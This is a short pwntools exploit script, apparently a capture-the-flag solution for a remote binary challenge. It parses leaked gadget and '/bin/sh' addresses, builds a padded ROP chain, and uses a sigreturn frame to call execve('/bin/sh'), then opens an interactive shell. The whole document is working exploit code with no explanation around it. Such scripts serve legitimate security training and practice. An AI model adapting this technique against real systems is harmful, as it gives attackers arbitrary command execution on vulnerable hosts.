from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 21978)
    else:
        return process(e.path)


p = start()

p.recvuntil(b'<<< Push your way to /bin/sh at : ')
bin_sh = int(p.recvline(), 16)
info("BinSH = %s", hex(bin_sh))

p.sendline(b'Y')
p.recvuntil(b'push 0x58585858; ret | ')
pop_rax = int(p.recvline(), 16)+6
info("Pop RAX = %s", hex(pop_rax))

ret = pop_rax+1

p.sendline(b'Y')
p.recvuntil(b'push 0x0f050f05; ret | ')
syscall_ret = int(p.recvline(), 16)+4
info("Syscall RET = %s", hex(syscall_ret))


def srop_exec():
    chain = p64(pop_rax)
    chain += p64(0xf)
    chain += p64(syscall_ret)

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh
    frame.rip = syscall_ret

    return chain+bytes(frame)


pad = p64(ret)*20
chain = srop_exec()
p.sendline(pad+chain)

p.interactive()
